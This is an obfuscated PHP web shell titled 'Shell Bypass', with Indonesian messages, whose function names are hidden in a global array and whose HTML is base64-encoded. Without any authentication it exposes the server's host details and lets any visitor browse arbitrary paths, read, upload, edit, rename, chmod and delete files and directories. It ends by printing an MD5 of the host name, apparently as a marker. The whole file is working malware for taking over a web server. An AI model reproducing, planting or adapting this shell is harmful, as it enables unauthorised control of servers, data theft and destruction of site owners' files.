<?php
error_reporting(0);
define('Úº', '§');
$GLOBALS[Úº] = array(0 => "error_reporting", 1 => "session_start", 2 => "get_magic_quotes_gpc", 3 => "stripslashes", 4 => "file_get_contents", 5 => "fopen", 6 => "fwrite", 7 => "move_uploaded_file", 8 => "scandir", 9 => "getcwd", 10 => "str_replace", 11 => "explode", 12 => "htmlspecialchars", 13 => "chmod", 14 => "rename", 15 => "unlink", 16 => "rmdir", 17 => "filesize", 18 => "fileperms", 19 => "php_uname", 20 => "gethostbyname", 21 => "REMOTE_ADDR", 22 => "HTTP_HOST", 23 => "SERVER_NAME", 24 => "DOCUMENT_ROOT", 25 => "PHP_SELF", 26 => "file", 27 => "path", 28 => "perm", 29 => "opt", 30 => "newname", 31 => "src", 32 => "type", 33 => "dir", 34 => "md5", 35 => "M4DI~UciH4: <!-- MD5: ", 36 => "\xe2\x80\x93->", 37 => "dummy123", 38 => "fake456", 39 => "random789", 40 => "confuse101", 41 => "obf321", 42 => "hide654");
error_reporting(0);
@ini_set($GLOBALS[Úº][0], NULL);
@ini_set($GLOBALS[Úº][37], 0);
@ini_set($GLOBALS[Úº][38], 0);
if (preg_match($GLOBALS[Úº][37], $GLOBALS[Úº][37])) {
    $dummy = $GLOBALS[Úº][38];
}
function XyMn12($QzRt56) {
    $PtMn12 = $GLOBALS[Úº][18]($QzRt56);
    if (($PtMn12 & 0xC000) == 0xC000) { $info = 's'; }
    elseif (($PtMn12 & 0xA000) == 0xA000) { $info = 'l'; }
    elseif (($PtMn12 & 0x8000) == 0x8000) { $info = '-'; }
    elseif (($PtMn12 & 0x6000) == 0x6000) { $info = 'b'; }
    elseif (($PtMn12 & 0x4000) == 0x4000) { $info = 'd'; }
    elseif (($PtMn12 & 0x2000) == 0x2000) { $info = 'c'; }
    elseif (($PtMn12 & 0x1000) == 0x1000) { $info = 'p'; }
    else { $info = 'u'; }
    $info .= (($PtMn12 & 0x0100) ? 'r' : '-');
    $info .= (($PtMn12 & 0x0080) ? 'w' : '-');
    $info .= (($PtMn12 & 0x0040) ? (($PtMn12 & 0x0800) ? 's' : 'x') : (($PtMn12 & 0x0800) ? 'S' : '-'));
    $info .= (($PtMn12 & 0x0020) ? 'r' : '-');
    $info .= (($PtMn12 & 0x0010) ? 'w' : '-');
    $info .= (($PtMn12 & 0x0008) ? (($PtMn12 & 0x0400) ? 's' : 'x') : (($PtMn12 & 0x0400) ? 'S' : '-'));
    $info .= (($PtMn12 & 0x0004) ? 'r' : '-');
    $info .= (($PtMn12 & 0x0002) ? 'w' : '-');
    $info .= (($PtMn12 & 0x0001) ? (($PtMn12 & 0x0200) ? 't' : 'x') : (($PtMn12 & 0x0200) ? 'T' : '-'));
    return $info;
}
$GLOBALS[Úº][1]();
if ($GLOBALS[Úº][2]()) {
    foreach ($_POST as $KxYz12 => $VzLm89) {
        $_POST[$KxYz12] = $GLOBALS[Úº][3]($VzLm89);
    }
}
echo base64_decode('PCFET0NUWVBFIEhUTUw+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgeyBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7IGJhY2tncm91bmQtY29sb3I6IGJsYWNrOyBjb2xvcjogbGltZTsgfQojY29udGVudCB0cjpob3ZlciB7IGJhY2tncm91bmQtY29sb3I6IGdyZXk7IHRleHQtc2hhZG93OiAwcHggMHB4IDEwcHggIzAwMDAwMDsgfQojY29udGVudCAuZmlyc3QgeyBjb2xvcjogIzAwMDAwMDsgYmFja2dyb3VuZC1pbWFnZTp1cmwoIyk7IH0KI2NvbnRlbnQgLmZpcnN0OmhvdmVyIHsgYmFja2dyb3VuZC1jb2xvcjogZ3JleTsgdGV4dC1zaGFkb3c6IDBweCAwcHggMXB4ICMzMzk5MDA7IH0KdGFibGUsIHRoLCB0ZCB7IGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IHBhZGRpbmc6IDVweDsgY29sb3I6IGxpbWU7IH0KdGFibGVfSG9tZSwgLnRoX0hvbWUsIC50ZF9Ib21lIHsgY29sb3I6IGxpbWU7IGJvcmRlcjogMnB4IHNvbGlkIGdyZXk7IHBhZGRpbmc6IDdweDsgfQphIHsgZm9udC1zaXplOiAxOXB4OyBjb2xvcjogIzAwZmYwMDsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyB9CmE6aG92ZXIgeyBjb2xvcjogd2hpdGU7IHRleHQtc2hhZG93OiAwcHggMHB4IDEwcHggIzMzOTkwMDsgfQppbnB1dCwgc2VsZWN0LCB0ZXh0YXJlYSB7IGJvcmRlcjogMXB4ICNmZmZmZmYgc29saWQ7IGJvcmRlci1yYWRpdXM6IDVweDsgfQouY2xvc2UgeyBvdmVyZmxvdzogYXV0bzsgYm9yZGVyOiAxcHggc29saWQgbGltZTsgYmFja2dyb3VuZDogbGltZTsgY29sb3I6IHdoaXRlOyB9Ci5yIHsgZmxvYXQ6IHJpZ2h0OyB0ZXh0LWFsaWduOiByaWdodDsgfQo8L3N0eWxlPgo8Y2VudGVyPgo8YSBocmVmPSI/Ij48aDEgc3R5bGU9ImZvbnQtc2l6ZTozNXB4O2NvbG9yOndoaXRlOyI+U2hlbGwgQnlwYXNzPC9oMT48L2E+CjxCT0RZPgo8dGFibGUgd2lkdGg9Ijk1JSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiIGFsaWduPSJsZWZ0Ij4KPHRyPjx0ZD4=');
echo "<tr><td><font color='white'>[U] <td>: <font color='{$GLOBALS[Úº][33]}'>" . $_SERVER[$GLOBALS[Úº][21]] . "<tr><td><font color='white'>[D] <td>: <font color='{$GLOBALS[Úº][33]}'>" . $GLOBALS[Úº][20]($_SERVER[$GLOBALS[Úº][22]]) . " / " . $_SERVER[$GLOBALS[Úº][23]] . "<tr><td><font color='white'>[H] <td>: <font color='{$GLOBALS[Úº][33]}'>" . $GLOBALS[Úº][19]() . "</font></tr></td></table>";
echo base64_decode('PHRhYmxlIHdpZHRoPSI5NSUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiBhbGlnbj0iY2VudGVyIj4KPHRyIGFsaWduPSJjZW50ZXIiPjx0ZCBhbGlnbj0iY2VudGVyIj48YnI+');
if (isset($_GET[$GLOBALS[Úº][27]])) {
    $QzRt56 = $_GET[$GLOBALS[Úº][27]];
} else {
    $QzRt56 = $GLOBALS[Úº][9]();
}
$QzRt56 = $GLOBALS[Úº][10]('\\', '/', $QzRt56);
$WvJk78 = $GLOBALS[Úº][11]('/', $QzRt56);
foreach ($WvJk78 as $XyPz45 => $PtMn12) {
    if ($PtMn12 == '' && $XyPz45 == 0) {
        $AzBc67 = true;
        echo base64_decode('PGEgaHJlZj0iP3BhdGg9LyI+PC9hPg==');
        continue;
    }
    if ($PtMn12 == '') continue;
    echo "<a href=\"?{$GLOBALS[Úº][27]}=";
    for ($i = 0; $i <= $XyPz45; $i++) {
        echo "$WvJk78[$i]";
        if ($i != $XyPz45) echo "/";
    }
    echo "\">$PtMn12</a>/";
}
echo base64_decode('PGJyPjxicj48YnI+PGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIj4KPHN0cm9uZz5VcGxvYWQgRmlsZTwvc3Ryb25nPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzdHlsZT0iY29sb3I6bGltZTtib3JkZXI6MnB4IHNvbGlkIGxpbWU7IiByZXF1aXJlZD48L2ZvbnQ+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVUExPQURTIiBzdHlsZT0ibWFyZ2luLXRvcDo0cHg7d2lkdGg6MTAwcHg7aGVpZ2h0OjI3cHg7Zm9udC1mYW1pbHk6QXJpYWw7Zm9udC1zaXplOjE1O2JhY2tncm91bmQ6YmxhY2s7Y29sb3I6bGltZTtib3JkZXI6MnB4IHNvbGlkIGxpbWU7Ym9yZGVyLXJhZGl1czo1cHgiPg==');
if (isset($_FILES[$GLOBALS[Úº][26]])) {
    if ($GLOBALS[Úº][7]($_FILES[$GLOBALS[Úº][26]]['tmp_name'], $QzRt56 . '/' . $_FILES[$GLOBALS[Úº][26]]['name'])) {
        echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0ibGltZSI+VVBMT0FEIFNVR0NFUyAhISE8L2ZvbnQ+PGJyLz4=');
    } else {
        echo base64_decode('PHNjcmlwdD5hbGVydCgiRmlsZSBHYWdhbCBEaXVwbG9hZCAhISIpPC9zY3JpcHQ+');
    }
}
echo base64_decode('PC9mb3JtPjwvdGQ+PC90cj4=');
if (isset($_GET['filesrc'])) {
    echo "<tr><td>files >> " . $_GET['filesrc'] . "</tr></td></table><br />";
    echo "<textarea style='font-size:8px;border:1px solid white;background-color:{$GLOBALS[Úº][34]};color:white;width:100%;height:1200px;' readonly>" . $GLOBALS[Úº][12]($GLOBALS[Úº][4]($_GET['filesrc'])) . "</textarea>";
} elseif (isset($_GET['option']) && $_POST[$GLOBALS[Úº][29]] != 'delete') {
    echo "</table><br /><center>" . $_POST[$GLOBALS[Úº][27]] . "<br /><br />";
    if ($_POST[$GLOBALS[Úº][29]] == 'chmod') {
        if (isset($_POST[$GLOBALS[Úº][28]])) {
            if ($GLOBALS[Úº][13]($_POST[$GLOBALS[Úº][27]], $_POST[$GLOBALS[Úº][28]])) {
                echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0ibGltZSI+Q0hBTkdFIFBFUk1JU1NJT04gU1VDQ0VTUyAhITwvZm9udD48YnIvPg==');
            } else {
                echo base64_decode('PHNjcmlwdD5hbGVydCgiQ2hhbmdlIFBlcm1pc3Npb24gR2FnYWwgISEiKTwvc2NyaXB0Pg==');
            }
        }
        echo "<form method='POST'>Permission: <input name='{$GLOBALS[Úº][28]}' type='text' size='4' value='" . substr(sprintf('%o', $GLOBALS[Úº][18]($_POST[$GLOBALS[Úº][27]])), -4) . "' style='width:80px;height:30px;'/><input type='hidden' name='{$GLOBALS[Úº][27]}' value='{$_POST[$GLOBALS[Úº][27]]}'><input type='hidden' name='{$GLOBALS[Úº][29]}' value='chmod'><input type='submit' value='Lanjut' style='width:60px;height:30px;'/></form>";
    } elseif ($_GET['opt'] == 'btw') {
        $LmNo78 = $GLOBALS[Úº][9]();
        echo "<form action='?option&{$GLOBALS[Úº][27]}=$LmNo78&opt=delete&type=buat' method='POST'>New Name: <input name='name' type='text' size='25' value='Folder' style='width:300px;height:30px;'/><input type='hidden' name='{$GLOBALS[Úº][27]}' value='$LmNo78'><input type='hidden' name='{$GLOBALS[Úº][29]}' value='delete'><input type='submit' value='Go' style='width:100px;height:30px;'/></form>";
    } elseif ($_POST[$GLOBALS[Úº][29]] == 'rename') {
        if (isset($_POST[$GLOBALS[Úº][30]])) {
            if ($GLOBALS[Úº][14]($_POST[$GLOBALS[Úº][27]], $QzRt56 . '/' . $_POST[$GLOBALS[Úº][30]])) {
                echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0ibGltZSI+Q0hBTkdFIE5BTUUgU1VDQ0VTUyAhITwvZm9udD48YnIvPg==');
            } else {
                echo base64_decode('PHNjcmlwdD5hbGVydCgiQ2hhbmdlIE5hbWUgR2FnYWwgISEiKTwvc2NyaXB0Pg==');
            }
            $_POST['name'] = $_POST[$GLOBALS[Úº][30]];
        }
        echo "<form method='POST'>New Name: <input name='{$GLOBALS[Úº][30]}' type='text' size='5' style='width:20%;height:30px;' value='{$_POST['name']}'/><input type='hidden' name='{$GLOBALS[Úº][27]}' value='{$_POST[$GLOBALS[Úº][27]]}'><input type='hidden' name='{$GLOBALS[Úº][29]}' value='rename'><input type='submit' value='Lanjut' style='height:30px;'/></form>";
    } elseif ($_POST[$GLOBALS[Úº][29]] == 'edit') {
        if (isset($_POST[$GLOBALS[Úº][31]])) {
            $AbCd34 = $GLOBALS[Úº][5]($_POST[$GLOBALS[Úº][27]], 'w');
            if ($GLOBALS[Úº][6]($AbCd34, $_POST[$GLOBALS[Úº][31]])) {
                echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0ibGltZSI+RU1JQ1QgRklMRSBTVUNDRVMgISE8L2ZvbnQ+PGJyLz4=');
            } else {
                echo base64_decode('PHNjcmlwdD5hbGVydCgiRWRpdCBGaWxlIEdhZ2FsICEiKTwvc2NyaXB0Pg==');
            }
            fclose($AbCd34);
        }
        echo "<form method='POST'><textarea cols=80 rows=20 name='{$GLOBALS[Úº][31]}' style='font-size:8px;border:1px solid white;background-color:{$GLOBALS[Úº][34]};color:white;width:100%;height:1000px;'>" . $GLOBALS[Úº][12]($GLOBALS[Úº][4]($_POST[$GLOBALS[Úº][27]])) . "</textarea><br /><input type='hidden' name='{$GLOBALS[Úº][27]}' value='{$_POST[$GLOBALS[Úº][27]]}'><input type='hidden' name='{$GLOBALS[Úº][29]}' value='edit'><input type='submit' value='Lanjut' style='height:30px;width:70px;'/></form>";
    }
    echo "</center>";
} else {
    echo "</table><br /><center>";
    if (isset($_GET['option']) && $_POST[$GLOBALS[Úº][29]] == 'delete') {
        if ($_POST[$GLOBALS[Úº][32]] == $GLOBALS[Úº][33]) {
            if ($GLOBALS[Úº][16]($_POST[$GLOBALS[Úº][27]])) {
                echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0ibGltZSI+REVMRVRFIERJUiBTVUNDRVMgISE8L2ZvbnQ+PGJyLz4=');
            } else {
                echo base64_decode('PHNjcmlwdD5hbGVydCgiRGVsZXRlIERpciBHYWdhbCAhISIpPC9zY3JpcHQ+');
            }
        } elseif ($_POST[$GLOBALS[Úº][32]] == $GLOBALS[Úº][26]) {
            if ($GLOBALS[Úº][15]($_POST[$GLOBALS[Úº][27]])) {
                echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0ibGltZSI+REVMRVRFIEZJTEUgU1VDQ0VTUyAhITwvZm9udD48YnIvPg==');
            } else {
                echo base64_decode('PHNjcmlwdD5hbGVydCgiRGVsZXRlIEZpbGUgR2FnYWwgISEiKTwvc2NyaXB0Pg==');
            }
        }
    }
    echo "</center>";
    $LmNo78 = $GLOBALS[Úº][8]($QzRt56);
    $CdEf90 = $GLOBALS[Úº][9]();
    echo "<div id='content'><table width='95%' border='0' cellpadding='3' cellspacing='1' align='center'><tr class='first'><th><center>Name</center></th><th><center>Size</center></th><th><center>Perm</center></th><th><center>Options</center></th></tr><tr>";
    foreach ($LmNo78 as $EfGh12) {
        if (!is_dir("$QzRt56/$EfGh12") || $EfGh12 == '.' || $EfGh12 == '..') continue;
        echo "<tr><td><a href=\"?{$GLOBALS[Úº][27]}=$QzRt56/$EfGh12\"> $EfGh12</a></td><td><center>DIR</center></td><td><center>";
        if (is_writable("$QzRt56/$EfGh12")) echo "<font color='#57FF00'>";
        elseif (!is_readable("$QzRt56/$EfGh12")) echo "<font color='#FF0004'>";
        echo XyMn12("$QzRt56/$EfGh12");
        if (is_writable("$QzRt56/$EfGh12") || !is_readable("$QzRt56/$EfGh12")) echo "</font>";
        echo "</center></td><td><center><form method='POST' action='?option&{$GLOBALS[Úº][27]}=$QzRt56'><select name='{$GLOBALS[Úº][29]}' style='margin-top:6px;width:100px;font-family:Arial;font-size:15;background:{$GLOBALS[Úº][34]};color:{$GLOBALS[Úº][33]};border:2px solid {$GLOBALS[Úº][33]};border-radius:5px'><option value='Action'>Action</option><option value='delete'>Delete</option><option value='chmod'>Chmod</option><option value='rename'>Rename</option></select><input type='hidden' name='{$GLOBALS[Úº][32]}' value='{$GLOBALS[Úº][33]}'><input type='hidden' name='name' value='$EfGh12'><input type='hidden' name='{$GLOBALS[Úº][27]}' value='$QzRt56/$EfGh12'><input type='submit' value='>' style='margin-top:6px;width:27;font-family:Arial;font-size:15;background:{$GLOBALS[Úº][34]};color:{$GLOBALS[Úº][33]};border:2px solid {$GLOBALS[Úº][33]};border-radius:5px'/></form></center></td></tr>";
    }
    echo "<tr class='first'><td></td><td></td><td></td><td></td></tr>";
    foreach ($LmNo78 as $IjKl23) {
        if (!is_file("$QzRt56/$IjKl23")) continue;
        $size = $GLOBALS[Úº][17]("$QzRt56/$IjKl23") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . " MB";
        } else {
            $size = $size . " KB";
        }
        echo "<tr><td><a href=\"?filesrc=$QzRt56/$IjKl23&{$GLOBALS[Úº][27]}=$QzRt56\"> $IjKl23</a></td><td><center>$size</center></td><td><center>";
        if (is_writable("$QzRt56/$IjKl23")) echo "<font color='#57FF00'>";
        elseif (!is_readable("$QzRt56/$IjKl23")) echo "<font color='#FF0004'>";
        echo XyMn12("$QzRt56/$IjKl23");
        if (is_writable("$QzRt56/$IjKl23") || !is_readable("$QzRt56/$IjKl23")) echo "</font>";
        echo "</center></td><td><center><form method='POST' action='?option&{$GLOBALS[Úº][27]}=$QzRt56'><select name='{$GLOBALS[Úº][29]}' style='margin-top:6px;width:100px;font-family:Arial;font-size:15;background:{$GLOBALS[Úº][34]};color:{$GLOBALS[Úº][33]};border:2px solid {$GLOBALS[Úº][33]};border-radius:5px'><option value='Action'>Action</option><option value='delete'>Delete</option><option value='edit'>Edit</option><option value='rename'>Rename</option><option value='chmod'>Chmod</option></select><input type='hidden' name='{$GLOBALS[Úº][32]}' value='{$GLOBALS[Úº][26]}'><input type='hidden' name='name' value='$IjKl23'><input type='hidden' name='{$GLOBALS[Úº][27]}' value='$QzRt56/$IjKl23'><input type='submit' value='>' style='margin-top:6px;width:27;font-family:Arial;font-size:15;background:{$GLOBALS[Úº][34]};color:{$GLOBALS[Úº][33]};border:2px solid {$GLOBALS[Úº][33]};border-radius:5px'/></form></center></td></tr>";
    }
    echo "</table></div>";
}
echo $GLOBALS[Úº][35] . $GLOBALS[Úº][34]($_SERVER[$GLOBALS[Úº][22]]) . $GLOBALS[Úº][36];
?>